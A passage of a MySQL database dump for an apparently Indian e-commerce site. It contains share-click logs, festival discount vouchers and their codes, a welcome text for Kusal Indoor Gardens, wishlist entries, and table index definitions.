(69, 'web', 'facebook', '2021-11-12 17:50:28', 56),
(70, 'web', 'facebook', '2021-11-12 17:50:29', 56),
(71, 'web', 'facebook', '2021-11-12 17:50:31', 56),
(72, 'web', 'facebook', '2021-11-12 17:50:32', 56),
(73, 'web', 'facebook', '2021-11-12 17:50:33', 56),
(74, 'web', 'facebook', '2021-11-12 17:50:35', 56),
(75, 'web', 'facebook', '2021-11-12 17:50:36', 56),
(76, 'web', 'facebook', '2021-11-12 17:50:38', 56),
(77, 'web', 'facebook', '2021-11-12 17:50:39', 56),
(78, 'web', 'facebook', '2021-11-12 17:50:40', 56),
(79, 'web', 'facebook', '2021-11-12 17:50:42', 56),
(80, 'web', 'facebook', '2021-11-12 17:50:43', 56),
(81, 'web', 'facebook', '2021-11-12 17:50:44', 56),
(82, 'web', 'facebook', '2021-11-12 17:50:45', 56),
(83, 'web', 'facebook', '2021-11-12 17:50:47', 56),
(84, 'web', 'facebook', '2021-11-12 17:50:48', 56),
(85, 'web', 'facebook', '2021-11-12 17:50:50', 56),
(86, 'web', 'facebook', '2021-11-12 17:50:51', 56),
(87, 'web', 'facebook', '2021-11-12 17:50:52', 56),
(88, 'web', 'facebook', '2021-11-12 17:50:54', 56),
(89, 'web', 'facebook', '2021-11-12 17:50:55', 56),
(90, 'web', 'facebook', '2021-11-12 17:50:56', 56),
(91, 'web', 'facebook', '2021-11-12 17:50:58', 56),
(92, 'web', 'facebook', '2021-11-12 17:51:00', 56),
(93, 'web', 'facebook', '2021-11-12 17:51:02', 56),
(94, 'web', 'facebook', '2021-11-12 17:51:03', 56),
(95, 'web', 'facebook', '2021-11-12 17:51:05', 56),
(96, 'web', 'facebook', '2021-11-12 17:51:06', 56),
(97, 'web', 'facebook', '2021-11-12 17:51:07', 56),
(98, 'web', 'facebook', '2021-11-12 17:51:08', 56),
(99, 'web', 'facebook', '2021-11-12 17:51:10', 56),
(100, 'web', 'facebook', '2021-11-12 17:51:11', 56),
(101, 'web', 'facebook', '2021-11-12 17:51:12', 56),
(102, 'web', 'facebook', '2021-11-12 17:51:13', 56),
(103, 'web', 'facebook', '2021-11-12 17:51:14', 56),
(104, 'web', 'facebook', '2021-11-12 17:51:15', 56),
(105, 'web', 'facebook', '2021-11-12 17:51:16', 56),
(106, 'web', 'facebook', '2021-11-12 17:51:18', 56),
(107, 'web', 'facebook', '2021-11-12 17:51:19', 56),
(108, 'web', 'facebook', '2021-11-12 17:51:21', 56),
(109, 'web', 'facebook', '2021-11-12 17:51:22', 56),
(110, 'web', 'facebook', '2021-11-12 17:51:23', 56),
(111, 'web', 'facebook', '2021-11-12 17:51:25', 56),
(112, 'web', 'facebook', '2021-11-12 17:51:26', 56),
(113, 'web', 'facebook', '2021-11-12 17:51:27', 56),
(114, 'web', 'facebook', '2021-11-12 17:51:56', 56),
(115, 'web', 'facebook', '2021-11-12 17:51:58', 56),
(116, 'web', 'facebook', '2021-11-12 17:52:00', 56),
(117, 'web', 'facebook', '2021-11-12 17:52:01', 56),
(118, 'web', 'facebook', '2021-11-12 17:52:03', 56),
(119, 'web', 'facebook', '2021-11-12 17:52:04', 56),
(120, 'web', 'facebook', '2021-11-12 17:52:05', 56),
(121, 'web', 'facebook', '2021-11-12 17:52:06', 56),
(122, 'web', 'facebook', '2021-11-12 17:52:08', 56),
(123, 'web', 'facebook', '2021-11-12 17:52:09', 56),
(124, 'web', 'facebook', '2021-11-12 17:52:10', 56),
(125, 'web', 'facebook', '2021-11-12 17:52:11', 56),
(126, 'web', 'facebook', '2021-11-12 17:52:13', 56),
(127, 'web', 'facebook', '2021-11-12 17:52:14', 56),
(128, 'web', 'facebook', '2021-11-12 17:52:15', 56),
(129, 'web', 'facebook', '2021-11-12 17:52:16', 56),
(130, 'web', 'facebook', '2021-11-12 17:52:17', 56),
(131, 'web', 'facebook', '2021-11-12 17:52:18', 56),
(132, 'web', 'facebook', '2021-11-12 17:52:19', 56),
(133, 'web', 'facebook', '2021-11-12 17:52:21', 56),
(134, 'web', 'facebook', '2021-11-12 17:52:22', 56),
(135, 'web', 'facebook', '2021-11-12 17:52:23', 56),
(136, 'web', 'facebook', '2021-11-12 17:52:24', 56),
(137, 'web', 'facebook', '2021-11-12 17:52:25', 56),
(138, 'web', 'facebook', '2021-11-12 17:52:27', 56),
(139, 'web', 'facebook', '2021-11-12 17:52:28', 56),
(140, 'web', 'facebook', '2021-11-12 17:52:29', 56),
(141, 'web', 'facebook', '2021-11-12 17:52:30', 56),
(142, 'web', 'facebook', '2021-11-12 17:52:31', 56),
(143, 'web', 'facebook', '2021-11-12 17:52:33', 56),
(144, 'web', 'facebook', '2021-11-12 17:52:34', 56),
(145, 'web', 'facebook', '2021-11-12 17:52:35', 56),
(146, 'web', 'facebook', '2021-11-12 17:52:36', 56),
(147, 'web', 'facebook', '2021-11-12 17:52:37', 56),
(148, 'web', 'facebook', '2021-11-12 17:52:39', 56),
(149, 'web', 'facebook', '2021-11-12 17:52:40', 56),
(150, 'web', 'facebook', '2021-11-12 17:52:41', 56),
(151, 'web', 'facebook', '2021-11-12 17:52:42', 56),
(152, 'web', 'facebook', '2021-11-12 17:52:44', 56),
(153, 'web', 'facebook', '2021-11-12 17:52:45', 56),
(154, 'web', 'facebook', '2021-11-12 17:52:46', 56),
(155, 'web', 'facebook', '2021-11-12 17:52:47', 56),
(156, 'web', 'facebook', '2021-11-12 17:52:48', 56),
(157, 'web', 'facebook', '2021-11-12 17:52:50', 56),
(158, 'web', 'facebook', '2021-11-12 17:52:51', 56),
(159, 'web', 'facebook', '2021-11-12 17:52:52', 56),
(160, 'web', 'facebook', '2021-11-12 17:52:53', 56),
(161, 'web', 'facebook', '2021-11-12 17:56:24', 56),
(162, 'web', 'facebook', '2021-11-12 17:56:25', 56),
(163, 'web', 'facebook', '2021-11-12 17:56:27', 56),
(164, 'web', 'facebook', '2021-11-12 17:56:27', 56),
(165, 'web', 'facebook', '2021-11-12 17:56:29', 56),
(166, 'web', 'facebook', '2021-11-12 17:56:30', 56),
(167, 'web', 'facebook', '2021-11-12 17:56:31', 56),
(168, 'web', 'facebook', '2021-11-12 17:56:32', 56),
(169, 'web', 'facebook', '2021-11-12 17:56:33', 56),
(170, 'web', 'facebook', '2021-11-12 17:56:35', 56),
(171, 'web', 'facebook', '2021-11-12 17:56:36', 56),
(172, 'web', 'facebook', '2021-11-12 17:56:37', 56),
(173, 'web', 'facebook', '2021-11-12 17:56:38', 56),
(174, 'web', 'facebook', '2021-11-12 17:56:40', 56),
(175, 'web', 'facebook', '2021-11-12 17:56:41', 56),
(176, 'web', 'facebook', '2021-11-12 17:56:42', 56),
(177, 'web', 'facebook', '2021-11-12 17:56:43', 56),
(178, 'web', 'facebook', '2021-11-12 17:56:44', 56),
(179, 'web', 'facebook', '2021-11-12 17:56:45', 56),
(180, 'web', 'facebook', '2021-11-12 17:56:47', 56),
(181, 'web', 'facebook', '2021-11-12 17:56:48', 56),
(182, 'web', 'facebook', '2021-11-12 17:56:49', 56),
(183, 'web', 'facebook', '2021-11-12 17:56:50', 56),
(184, 'web', 'facebook', '2021-11-12 17:56:51', 56),
(185, 'web', 'facebook', '2021-11-12 17:56:52', 56),
(186, 'web', 'facebook', '2021-11-12 17:56:53', 56),
(187, 'web', 'facebook', '2021-11-12 17:56:54', 56),
(188, 'web', 'facebook', '2021-11-12 17:56:55', 56),
(189, 'web', 'facebook', '2021-11-12 17:56:56', 56),
(190, 'web', 'facebook', '2021-11-12 17:56:57', 56),
(191, 'web', 'facebook', '2021-11-12 17:56:58', 56),
(192, 'web', 'facebook', '2021-11-12 17:57:00', 56),
(193, 'web', 'facebook', '2021-11-12 17:57:01', 56),
(194, 'web', 'facebook', '2021-11-12 17:57:02', 56),
(195, 'web', 'facebook', '2021-11-12 17:57:03', 56),
(196, 'web', 'facebook', '2021-11-12 17:57:04', 56),
(197, 'web', 'facebook', '2021-11-12 17:57:05', 56),
(198, 'web', 'facebook', '2021-11-12 17:57:06', 56),
(199, 'web', 'facebook', '2021-11-12 17:57:08', 56),
(200, 'web', 'facebook', '2021-11-12 17:57:09', 56),
(201, 'web', 'facebook', '2021-11-12 17:57:10', 56),
(202, 'web', 'facebook', '2021-11-12 17:57:11', 56),
(203, 'web', 'facebook', '2021-11-12 17:57:12', 56),
(204, 'web', 'facebook', '2021-11-12 17:57:14', 56),
(205, 'web', 'facebook', '2021-11-12 17:57:15', 56),
(206, 'web', 'facebook', '2021-11-12 17:57:16', 56),
(207, 'web', 'facebook', '2021-11-12 17:57:17', 56),
(208, 'web', 'facebook', '2021-11-12 17:57:18', 56),
(209, 'web', 'facebook', '2021-11-12 17:57:20', 56),
(210, 'web', 'facebook', '2021-11-12 17:57:21', 56),
(211, 'web', 'facebook', '2021-11-12 17:57:22', 56),
(212, 'web', 'facebook', '2021-11-12 17:57:23', 56),
(213, 'web', 'facebook', '2021-11-12 17:57:24', 56),
(214, 'web', 'facebook', '2021-11-12 17:57:25', 56),
(215, 'web', 'facebook', '2021-11-12 17:57:27', 56),
(216, 'web', 'facebook', '2021-11-12 17:57:28', 56),
(217, 'web', 'facebook', '2021-11-12 17:57:29', 56),
(218, 'web', 'facebook', '2021-11-12 17:57:30', 56),
(219, 'web', 'facebook', '2021-11-12 17:57:31', 56),
(220, 'web', 'facebook', '2021-11-12 17:57:32', 56),
(221, 'web', 'facebook', '2021-11-12 17:57:33', 56),
(222, 'web', 'facebook', '2021-11-12 17:57:34', 56),
(223, 'web', 'facebook', '2021-11-12 17:57:35', 56),
(224, 'web', 'facebook', '2021-11-12 17:57:37', 56),
(225, 'web', 'facebook', '2021-11-12 17:57:38', 56),
(226, 'web', 'facebook', '2021-11-12 17:57:39', 56),
(227, 'web', 'facebook', '2021-11-12 17:57:40', 56),
(228, 'web', 'facebook', '2021-11-12 17:57:41', 56),
(229, 'web', 'facebook', '2021-11-12 17:57:42', 56),
(230, 'web', 'facebook', '2021-11-12 17:57:43', 56),
(231, 'web', 'facebook', '2021-11-12 17:57:45', 56),
(232, 'web', 'facebook', '2021-11-12 17:57:46', 56),
(233, 'web', 'facebook', '2021-11-12 17:57:47', 56),
(234, 'web', 'facebook', '2021-11-12 17:57:48', 56),
(235, 'web', 'facebook', '2021-11-12 17:57:49', 56),
(236, 'web', 'facebook', '2021-11-12 17:57:50', 56),
(237, 'web', 'facebook', '2021-11-12 17:57:52', 56),
(238, 'web', 'facebook', '2021-11-12 17:57:53', 56),
(239, 'web', 'facebook', '2021-11-12 17:58:08', 56),
(240, 'web', 'facebook', '2021-11-12 17:59:25', 56),
(241, 'web', 'facebook', '2021-11-12 17:59:28', 56),
(242, 'web', 'facebook', '2021-11-12 17:59:32', 56),
(243, 'web', 'facebook', '2021-11-12 18:00:07', 56),
(244, 'web', 'facebook', '2021-11-12 18:00:08', 56),
(245, 'web', 'facebook', '2021-11-12 18:00:08', 56),
(246, 'web', 'facebook', '2021-11-12 18:00:09', 56),
(247, 'web', 'facebook', '2021-11-12 18:00:11', 56),
(248, 'web', 'facebook', '2021-11-12 18:00:11', 56),
(249, 'web', 'facebook', '2021-11-12 18:00:12', 56),
(250, 'web', 'facebook', '2021-11-12 18:00:14', 56),
(251, 'web', 'facebook', '2021-11-12 18:00:15', 56),
(252, 'web', 'facebook', '2021-11-12 18:00:16', 56),
(253, 'web', 'facebook', '2021-11-12 18:00:17', 56),
(254, 'web', 'facebook', '2021-11-12 18:00:18', 56),
(255, 'web', 'facebook', '2021-11-12 18:00:19', 56),
(256, 'web', 'facebook', '2021-11-12 18:00:20', 56),
(257, 'web', 'facebook', '2021-11-12 18:00:21', 56),
(258, 'web', 'facebook', '2021-11-12 18:00:22', 56),
(259, 'web', 'facebook', '2021-11-12 18:00:23', 56),
(260, 'web', 'facebook', '2021-11-12 18:00:24', 56),
(261, 'web', 'facebook', '2021-11-12 18:00:25', 56),
(262, 'web', 'facebook', '2021-11-12 18:00:26', 56),
(263, 'web', 'facebook', '2021-11-12 18:00:27', 56),
(264, 'web', 'facebook', '2021-11-12 18:00:28', 56),
(265, 'web', 'facebook', '2021-11-12 18:00:29', 56),
(266, 'web', 'facebook', '2021-11-12 18:00:30', 56),
(267, 'web', 'facebook', '2021-11-12 18:00:32', 56),
(268, 'web', 'facebook', '2021-11-12 18:00:34', 56),
(269, 'web', 'facebook', '2021-11-12 18:00:35', 56),
(270, 'web', 'facebook', '2021-11-12 18:00:36', 56),
(271, 'web', 'facebook', '2021-11-12 18:00:38', 56),
(272, 'web', 'facebook', '2021-11-12 18:00:39', 56),
(273, 'web', 'facebook', '2021-11-12 18:00:42', 56),
(274, 'web', 'facebook', '2021-11-12 18:00:43', 56),
(275, 'web', 'facebook', '2021-11-12 18:00:45', 56),
(276, 'web', 'facebook', '2021-11-12 18:00:46', 56),
(277, 'web', 'facebook', '2021-11-12 18:00:47', 56),
(278, 'web', 'facebook', '2021-11-12 18:00:49', 56),
(279, 'web', 'facebook', '2021-11-12 18:00:51', 56),
(280, 'web', 'facebook', '2021-11-12 18:00:53', 56),
(281, 'web', 'facebook', '2021-11-12 18:00:54', 56),
(282, 'web', 'facebook', '2021-11-12 18:00:56', 56),
(283, 'web', 'facebook', '2021-11-12 18:00:57', 56),
(284, 'web', 'facebook', '2021-11-12 18:01:00', 56),
(285, 'web', 'facebook', '2021-11-12 18:01:01', 56),
(286, 'web', 'facebook', '2021-11-12 18:01:02', 56),
(287, 'web', 'facebook', '2021-11-12 18:01:04', 56),
(288, 'web', 'facebook', '2021-11-12 18:01:05', 56),
(289, 'web', 'facebook', '2021-11-12 18:01:06', 56),
(290, 'web', 'facebook', '2021-11-12 18:01:07', 56),
(291, 'web', 'facebook', '2021-11-12 18:01:08', 56),
(292, 'web', 'facebook', '2021-11-12 18:01:09', 56),
(293, 'web', 'facebook', '2021-11-12 18:01:10', 56),
(294, 'web', 'facebook', '2021-11-12 18:01:11', 56),
(295, 'web', 'facebook', '2021-11-12 18:01:12', 56),
(296, 'web', 'facebook', '2021-11-12 18:01:14', 56),
(297, 'web', 'facebook', '2021-11-12 18:01:15', 56),
(298, 'web', 'facebook', '2021-11-12 18:01:16', 56),
(299, 'web', 'facebook', '2021-11-12 18:01:17', 56),
(300, 'web', 'facebook', '2021-11-12 18:15:33', 56),
(301, 'web', 'facebook', '2021-11-12 18:15:34', 56),
(302, 'web', 'facebook', '2021-11-12 18:15:35', 56),
(303, 'web', 'facebook', '2021-11-12 18:15:36', 56),
(304, 'web', 'facebook', '2021-11-12 18:15:37', 56),
(305, 'web', 'facebook', '2021-11-12 18:15:38', 56),
(306, 'web', 'facebook', '2021-11-12 18:15:40', 56),
(307, 'web', 'facebook', '2021-11-12 18:15:41', 56),
(308, 'web', 'facebook', '2021-11-12 18:15:42', 56),
(309, 'web', 'facebook', '2021-11-12 18:15:43', 56),
(310, 'web', 'facebook', '2021-11-12 18:15:44', 56),
(311, 'web', 'facebook', '2021-11-12 18:15:45', 56),
(312, 'web', 'facebook', '2021-11-12 18:15:47', 56),
(313, 'web', 'facebook', '2021-11-12 18:15:48', 56),
(314, 'web', 'facebook', '2021-11-12 18:15:50', 56),
(315, 'web', 'facebook', '2021-11-12 18:15:52', 56),
(316, 'web', 'facebook', '2021-11-12 18:15:53', 56),
(317, 'web', 'facebook', '2021-11-12 18:15:54', 56),
(318, 'web', 'facebook', '2021-11-24 11:37:07', 56),
(319, 'web', 'facebook', '2021-11-24 11:37:09', 56),
(320, 'web', 'facebook', '2021-11-24 11:37:11', 56),
(321, 'web', 'facebook', '2021-11-24 11:37:12', 56),
(322, 'web', 'facebook', '2021-11-24 11:37:13', 56),
(323, 'web', 'facebook', '2021-11-24 11:37:15', 56),
(324, 'web', 'facebook', '2021-11-24 11:37:16', 56),
(325, 'web', 'facebook', '2021-11-24 11:37:17', 56),
(326, 'web', 'facebook', '2021-11-24 11:37:18', 56),
(327, 'web', 'facebook', '2021-11-24 11:37:19', 56),
(328, 'web', 'facebook', '2021-11-24 11:37:20', 56),
(329, 'web', 'facebook', '2021-11-24 11:37:21', 56),
(330, 'web', 'facebook', '2021-11-24 11:37:22', 56),
(331, 'web', 'facebook', '2021-11-24 11:37:23', 56),
(332, 'web', 'facebook', '2021-11-24 11:37:24', 56),
(333, 'web', 'facebook', '2021-11-24 11:37:25', 56),
(334, 'web', 'facebook', '2021-11-24 11:37:26', 56),
(335, 'web', 'facebook', '2021-11-24 11:37:28', 56),
(336, 'web', 'facebook', '2021-11-24 11:37:29', 56),
(337, 'web', 'facebook', '2021-11-24 11:37:30', 56),
(338, 'web', 'facebook', '2021-11-24 11:37:31', 56),
(339, 'web', 'facebook', '2021-11-24 11:37:32', 56),
(340, 'web', 'facebook', '2021-11-24 11:37:33', 56),
(341, 'web', 'facebook', '2021-11-24 11:37:34', 56),
(342, 'web', 'facebook', '2021-11-24 11:37:35', 56),
(343, 'web', 'facebook', '2021-11-24 11:37:36', 56),
(344, 'web', 'facebook', '2021-11-24 11:37:37', 56),
(345, 'web', 'facebook', '2021-11-24 11:37:38', 56),
(346, 'web', 'facebook', '2021-11-24 11:37:40', 56),
(347, 'web', 'facebook', '2021-11-24 11:37:41', 56),
(348, 'web', 'facebook', '2021-11-24 11:37:42', 56),
(349, 'web', 'facebook', '2021-11-24 11:37:43', 56),
(350, 'web', 'facebook', '2021-11-24 11:37:44', 56),
(351, 'web', 'facebook', '2021-11-24 11:37:45', 56),
(352, 'web', 'facebook', '2021-11-24 11:37:46', 56),
(353, 'web', 'facebook', '2021-11-24 11:37:47', 56),
(354, 'web', 'facebook', '2021-11-24 11:37:49', 56),
(355, 'web', 'facebook', '2021-11-24 11:37:50', 56),
(356, 'web', 'facebook', '2021-11-24 11:37:51', 56),
(357, 'web', 'facebook', '2021-11-24 11:37:53', 56),
(358, 'web', 'facebook', '2021-11-24 11:37:54', 56),
(359, 'web', 'facebook', '2021-11-24 11:37:55', 56),
(360, 'web', 'facebook', '2021-11-24 11:37:56', 56),
(361, 'web', 'facebook', '2021-11-24 11:37:58', 56),
(362, 'web', 'facebook', '2021-11-24 11:37:59', 56),
(363, 'web', 'facebook', '2021-11-24 11:38:00', 56),
(364, 'web', 'facebook', '2021-11-24 11:38:01', 56),
(365, 'web', 'facebook', '2021-11-24 11:38:02', 56),
(366, 'web', 'facebook', '2021-11-24 11:38:03', 56),
(367, 'web', 'facebook', '2021-11-24 11:38:04', 56),
(368, 'web', 'facebook', '2021-11-24 11:38:06', 56),
(369, 'web', 'facebook', '2021-11-24 11:38:07', 56),
(370, 'web', 'facebook', '2021-11-24 11:38:08', 56),
(371, 'web', 'facebook', '2021-11-24 11:38:09', 56),
(372, 'web', 'facebook', '2021-11-24 11:38:10', 56),
(373, 'web', 'facebook', '2021-11-24 11:38:11', 56),
(374, 'web', 'facebook', '2021-11-24 11:38:12', 56),
(375, 'web', 'facebook', '2021-11-24 11:38:13', 56),
(376, 'web', 'facebook', '2021-11-24 11:38:14', 56),
(377, 'web', 'facebook', '2021-11-24 11:38:15', 56),
(378, 'web', 'facebook', '2021-11-24 11:38:16', 56),
(379, 'web', 'facebook', '2021-11-24 11:38:17', 56),
(380, 'web', 'facebook', '2021-11-24 11:38:18', 56),
(381, 'web', 'facebook', '2021-11-24 11:38:19', 56),
(382, 'web', 'facebook', '2021-11-24 11:38:20', 56),
(383, 'web', 'facebook', '2021-11-24 11:38:21', 56),
(384, 'web', 'facebook', '2021-11-24 11:38:22', 56),
(385, 'web', 'facebook', '2021-11-24 11:38:23', 56),
(386, 'web', 'facebook', '2021-11-24 11:38:25', 56),
(387, 'web', 'facebook', '2021-11-24 11:38:26', 56),
(388, 'web', 'facebook', '2021-11-24 11:38:27', 56),
(389, 'web', 'facebook', '2021-11-24 11:38:28', 56),
(390, 'web', 'facebook', '2021-11-24 11:38:29', 56),
(391, 'web', 'facebook', '2021-11-24 11:38:30', 56),
(392, 'web', 'facebook', '2021-11-24 11:38:31', 56),
(393, 'web', 'facebook', '2021-11-24 11:38:32', 56),
(394, 'web', 'facebook', '2021-11-24 11:38:33', 56),
(395, 'web', 'facebook', '2021-11-24 11:38:34', 56),
(396, 'web', 'facebook', '2021-11-24 11:38:35', 56),
(397, 'web', 'facebook', '2021-11-24 11:38:36', 56),
(398, 'web', 'facebook', '2021-11-24 11:38:37', 56),
(399, 'web', 'facebook', '2021-11-24 11:38:39', 56),
(400, 'web', 'facebook', '2021-11-24 11:38:40', 56),
(401, 'web', 'facebook', '2021-11-24 11:38:41', 56),
(402, 'web', 'facebook', '2021-11-24 11:38:42', 56),
(403, 'web', 'facebook', '2021-11-24 11:38:43', 56),
(404, 'web', 'facebook', '2021-11-24 11:38:44', 56),
(405, 'web', 'facebook', '2021-11-24 11:38:45', 56),
(406, 'web', 'facebook', '2021-11-24 11:38:46', 56),
(407, 'web', 'facebook', '2021-11-24 11:38:47', 56),
(408, 'web', 'facebook', '2021-11-24 11:38:48', 56),
(409, 'web', 'facebook', '2021-11-24 11:38:49', 56),
(410, 'web', 'facebook', '2021-11-24 11:38:50', 56),
(411, 'web', 'facebook', '2021-11-24 11:38:51', 56),
(412, 'web', 'facebook', '2021-11-24 11:38:52', 56),
(413, 'web', 'facebook', '2021-11-24 11:38:53', 56),
(414, 'web', 'facebook', '2021-11-24 11:38:54', 56),
(415, 'web', 'facebook', '2021-11-24 11:38:55', 56),
(416, 'web', 'facebook', '2021-11-24 11:38:57', 56),
(417, 'web', 'facebook', '2021-11-24 11:38:58', 56),
(418, 'web', 'facebook', '2021-11-24 11:38:59', 56),
(419, 'web', 'facebook', '2021-11-24 11:39:00', 56),
(420, 'web', 'facebook', '2021-11-24 11:39:01', 56),
(421, 'web', 'facebook', '2021-11-24 11:39:02', 56),
(422, 'web', 'facebook', '2021-11-24 11:39:03', 56),
(423, 'web', 'facebook', '2021-11-24 11:39:04', 56),
(424, 'web', 'facebook', '2021-11-24 11:39:05', 56),
(425, 'web', 'facebook', '2021-11-24 11:39:06', 56),
(426, 'web', 'facebook', '2021-11-24 11:39:07', 56),
(427, 'web', 'facebook', '2021-11-24 11:39:08', 56);

-- --------------------------------------------------------

--
-- Table structure for table `vouchers`
--

CREATE TABLE `vouchers` (
  `id` int(11) NOT NULL,
  `type` int(11) NOT NULL COMMENT '0->single; 1->multiple',
  `title` text NOT NULL,
  `from_date` date NOT NULL,
  `to_date` date NOT NULL,
  `discount` varchar(20) NOT NULL,
  `status` int(11) NOT NULL,
  `prefix` varchar(20) NOT NULL,
  `no_of_coupons` int(11) NOT NULL,
  `created_date` datetime NOT NULL,
  `modified_date` datetime NOT NULL,
  `user_id` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `vouchers`
--

INSERT INTO `vouchers` (`id`, `type`, `title`, `from_date`, `to_date`, `discount`, `status`, `prefix`, `no_of_coupons`, `created_date`, `modified_date`, `user_id`) VALUES
(1, 0, 'Festival Offer', '2022-01-29', '2022-01-31', '10', 0, 'GOGA2022', 1, '2022-01-29 17:19:52', '0000-00-00 00:00:00', 1),
(2, 0, 'demo', '2022-01-31', '2022-02-02', '10', 0, 'GO', 2, '2022-01-31 11:13:32', '2022-02-01 17:31:19', 1),
(3, 0, 'Gogarbha', '2022-02-21', '2022-02-28', '10', 0, 'GOG', 7, '2022-02-22 11:43:55', '2022-03-02 15:31:45', 1),
(4, 0, 'Shivrathri Festival', '2022-03-01', '2022-03-02', '15', 0, 'GGA', 4, '2022-03-02 15:36:47', '2022-03-02 15:44:20', 1),
(5, 0, 'chrishmas', '2022-03-07', '2022-03-31', '10', 0, 'GGA', 2, '2022-03-08 10:58:19', '0000-00-00 00:00:00', 1),
(6, 0, 'chrishmas', '2022-04-01', '2031-03-20', '10', 0, 'gog', 2, '2022-03-17 09:06:44', '2022-04-09 09:02:14', 1);

-- --------------------------------------------------------

--
-- Table structure for table `voucher_code`
--

CREATE TABLE `voucher_code` (
  `cid` int(11) NOT NULL,
  `code` text NOT NULL,
  `status` int(11) NOT NULL,
  `used_count` int(11) NOT NULL,
  `created_date` datetime NOT NULL,
  `modified_date` datetime NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `voucher_code`
--

INSERT INTO `voucher_code` (`cid`, `code`, `status`, `used_count`, `created_date`, `modified_date`) VALUES
(1, 'GOGA2022041886', 0, 0, '2022-01-29 17:19:52', '0000-00-00 00:00:00'),
(2, 'GO095911', 0, 0, '2022-01-31 11:13:32', '2022-02-01 17:31:19'),
(2, 'GO023324', 0, 0, '2022-01-31 11:13:32', '2022-02-01 17:31:19'),
(3, 'GOG011479', 0, 0, '2022-02-22 11:43:55', '2022-03-02 15:31:45'),
(3, 'GOG003232', 0, 0, '2022-02-22 11:43:55', '2022-03-02 15:31:45'),
(3, 'GOG045727', 0, 0, '2022-03-02 15:31:45', '0000-00-00 00:00:00'),
(3, 'GOG088717', 0, 0, '2022-03-02 15:31:45', '0000-00-00 00:00:00'),
(3, 'GOG027216', 0, 0, '2022-03-02 15:31:45', '0000-00-00 00:00:00'),
(3, 'GOG065864', 0, 0, '2022-03-02 15:31:45', '0000-00-00 00:00:00'),
(3, 'GOG090441', 0, 0, '2022-03-02 15:31:45', '0000-00-00 00:00:00'),
(4, 'GGA082265', 0, 0, '2022-03-02 15:36:47', '2022-03-02 15:44:20'),
(4, 'GGA019577', 0, 0, '2022-03-02 15:36:47', '2022-03-02 15:44:20'),
(4, 'GGA075522', 0, 0, '2022-03-02 15:44:20', '0000-00-00 00:00:00'),
(4, 'GGA051846', 0, 0, '2022-03-02 15:44:20', '0000-00-00 00:00:00'),
(5, 'GGA009586', 0, 0, '2022-03-08 10:58:19', '0000-00-00 00:00:00'),
(5, 'GGA051281', 0, 0, '2022-03-08 10:58:19', '0000-00-00 00:00:00'),
(6, 'gog075827', 0, 0, '2022-03-17 09:06:44', '2022-04-09 09:02:14'),
(6, 'gog021718', 0, 0, '2022-03-17 09:06:44', '2022-04-09 09:02:14');

-- --------------------------------------------------------

--
-- Table structure for table `welcometext`
--

CREATE TABLE `welcometext` (
  `id` int(11) NOT NULL,
  `welcometext` text NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `welcometext`
--

INSERT INTO `welcometext` (`id`, `welcometext`) VALUES
(1, '<p style=\"text-align:justify\">Kusal Indoor Gardens was established in the year 1993 at Bangalore, since then Kusal made its brand for artificial plants in the state as well as neighbouring states of TAMILNADU &amp; ANDHRA PRADESH. Being in the industry for 17 years, Highly Skilled and Innovative Experts Kusal indoor gardens has made a milestone in indoor and outdoor decoration for MNC&rsquo;s, Corporate sectors ,Star-hotels, Banking institutions, Software cos. Restaurants and of course homes. Having good clientele, smarter projects, &amp; tremendous Creativity. Kusal has opened its branches in major metros like Chennai and Hyderabad with a team working on high profile projects. And as our client say if its about GREEN kusal is the only name, and word of mouth is leading our business. Our experienced professionals visualize and customize plants and floral arrangements for larger projects, besides Homes and Offices and as our slogan apparently says,</p>\n\n<p style=\"text-align: center;\">&ldquo;A perfect and elegant imitation of nature&rdquo;</p>\n');

-- --------------------------------------------------------

--
-- Table structure for table `wishlist`
--

CREATE TABLE `wishlist` (
  `id` int(11) NOT NULL,
  `categ` text NOT NULL,
  `pid` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `created_date` datetime NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `wishlist`
--

INSERT INTO `wishlist` (`id`, `categ`, `pid`, `user_id`, `created_date`) VALUES
(31, 'oils_ointments', 56, 5, '2022-08-08 15:16:15'),
(28, 'cosmetics', 41, 5, '2022-08-08 11:29:27'),
(27, 'cosmetics', 43, 5, '2022-08-08 11:29:22'),
(32, 'garden_agriculture', 49, 5, '2022-08-10 10:14:00'),
(26, 'cosmetics', 42, 5, '2022-08-08 11:26:50'),
(20, 'cosmetics', 42, 34, '2022-08-02 04:51:37'),
(21, 'pooja_items', 95, 35, '2022-08-03 10:03:35'),
(35, 'pooja_items', 76, 5, '2022-09-10 20:04:47'),
(33, 'garden_agriculture', 50, 5, '2022-08-10 10:14:12'),
(46, 'garden_agriculture', 91, 5, '2023-01-07 08:54:12'),
(39, 'garden_agriculture', 47, 5, '2022-10-22 06:52:40'),
(41, 'pooja_items', 77, 5, '2022-11-04 11:44:24'),
(42, 'pooja_items', 105, 5, '2022-11-05 05:28:39'),
(43, 'pooja_items', 106, 5, '2022-11-05 05:29:29'),
(44, 'garden_agriculture', 50, 17, '2022-11-05 11:14:19'),
(45, 'pooja_items', 46, 5, '2022-11-06 02:07:59'),
(47, 'garden_agriculture', 47, 42, '2023-02-23 05:06:52'),
(48, 'garden_agriculture', 49, 43, '2023-02-23 06:18:33'),
(49, 'garden_agriculture', 50, 43, '2023-02-23 06:20:16'),
(50, 'pooja_items', 46, 40, '2023-02-23 11:10:14'),
(51, 'pooja_items', 76, 44, '2023-02-25 15:35:46');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `aboutus`
--
ALTER TABLE `aboutus`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `aboutus_kushal`
--
ALTER TABLE `aboutus_kushal`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `admin`
--
ALTER TABLE `admin`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `advertise`
--
ALTER TABLE `advertise`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `banner`
--
ALTER TABLE `banner`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `banner_kushal`
--
ALTER TABLE `banner_kushal`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `blogposts_comments`
--
ALTER TABLE `blogposts_comments`
  ADD PRIMARY KEY (`id`),
  ADD KEY `fid` (`fid`);

